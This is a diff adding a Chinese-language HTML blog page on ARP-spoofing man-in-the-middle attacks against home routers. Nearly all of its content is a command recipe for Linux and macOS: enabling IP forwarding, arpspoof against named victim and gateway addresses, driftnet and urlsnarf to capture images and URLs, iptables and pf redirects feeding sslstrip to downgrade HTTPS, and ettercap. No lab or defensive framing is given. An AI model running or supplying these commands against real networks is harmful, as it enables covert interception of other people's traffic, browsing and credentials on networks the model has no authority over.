@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="arp 渗透">
+    <meta name="keywords" content="arp 中间攻击 渗透">
+    <title>Arp 欺骗获取设备信息</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        :root {
+            --day-bg: #ffffff;
+            --day-text: #333333;
+            --night-bg: #1a1a1a;
+            --night-text: #f0f0f0;
+        }
+
+        body {
+            max-width: 820px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 21px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .metadata {
+            margin-bottom: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.05);
+            border-radius: 5px;
+        }
+
+        .metadata p {
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+
+        .day-mode {
+            background-color: var(--day-bg);
+            color: var(--day-text);
+        }
+
+        .night-mode {
+            background-color: var(--night-bg);
+            color: var(--night-text);
+        }
+
+        h1 { font-size: 19px; text-align: center; }
+        h2 { font-size: 18px; }
+        h3 { font-size: 16px; }
+        h4 { font-size: 14px; }
+        h5 { font-size: 12px; }
+        h6 { font-size: 11px; }
+
+        pre {
+            line-height: 24px;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Fira Code', Consolas, Monaco, 'Courier New', monospace;
+        }
+
+        img {
+            display: block;
+            max-width: 600px;
+            height: auto;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .content {
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            border-radius: 8px;
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            border-top: 1px solid #ddd;
+            font-size: 0.9em;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .content {
+            animation: fadeIn 0.5s ease-in;
+        }
+    </style>
+</head>
+<body class="day-mode">
+    <div class="metadata">
+        <p><strong>Title:</strong> Arp 欺骗获取设备信息</p>
+        <p><strong>Categories:</strong> </p>
+        <p><strong>Description:</strong> arp 渗透</p>
+        <p><strong>Keywords:</strong> arp 中间攻击 渗透</p>
+    </div>
+    <div class="content">
+        <p>家庭路由器中间人攻击以及数据获取。</p>
+<h2 id="arp">Arp过程介绍</h2>
+<h3 id="linux">Linux</h3>
+<pre class="codehilite"><code class="language-bash"># 开启端口转发
+echo 1 &gt;/proc/sys/net/ipv4/ip_forward
+# 监控图片
+driftnet -i eth0 -d ~/Desktop/pic -a
+driftnet -i eth0
+# 监控 URL
+urlsnarf -i eth0
+# 通过iptables 转发
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &lt;yourListenPort&gt;
+
+# 欺骗目标机器
+arpspoof  -i eth0 -t 192.168.2.165 192.168.2.1
+# 欺骗网关
+arpspoof -i eth0  -t 192.168.2.1 192.168.2.150
+
+# 过滤欺骗
+arpspoof -i eth0 -c own -t 192.168.2.213 192.168.2.1 
+
+## sslstrip -l  &lt;yourListenPort&gt;
+#负责截获数据 
+sslstrip 
+## 开启抓包工具
+wirewhark 
+</code></pre>
+
+<h3 id="mac">mac</h3>
+<pre class="codehilite"><code class="language-bash">rdr pass on en0 proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080
+
+sslstrip -l 8080 
+
+# 修改 /etc/pf.conf 文件，在适当的位置加入
+rdr-anchor &quot;http-forwarding&quot;
+
+load anchor &quot;http-forwarding&quot; from &quot;/etc/pf.anchors/http&quot;
+
+# 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E
+
+# 转发 sudo sysctl -w net.inet.ip.forwarding=1
+# 查看转发情况 sudo sysctl -a | grep forward
+
+# arpspoof -i en0 -t (目标IP) (网关IP)
+arpspoof -i en0 -t 10.196.17.58 10.196.17.1
+
+arpspoof -i en0 -t 10.196.17.1 10.196.17.24
+
+# 截获流量 
+sudo ettercap -G
+# 选择target1
+
+# 网关 欺骗 dsniff -i eth0
+</code></pre>
+
+<h3 id="filter">filter</h3>
+<pre class="codehilite"><code class="language-bash">ip.src==192.168.2.213 and http
+</code></pre>
+
+<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
+    </div>
+    <footer>
+        Power By Python Markdown Generate 2024-11-11 11:02:36
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+
+        function setThemeMode() {
+            const hour = new Date().getHours();
+            const body = document.body;
+            if (hour >= 18 || hour < 6) {
+                body.classList.remove('day-mode');
+                body.classList.add('night-mode');
+            } else {
+                body.classList.remove('night-mode');
+                body.classList.add('day-mode');
+            }
+        }
+
+        setThemeMode();
+        setInterval(setThemeMode, 60000);
+    </script>
+</body>
+</html>
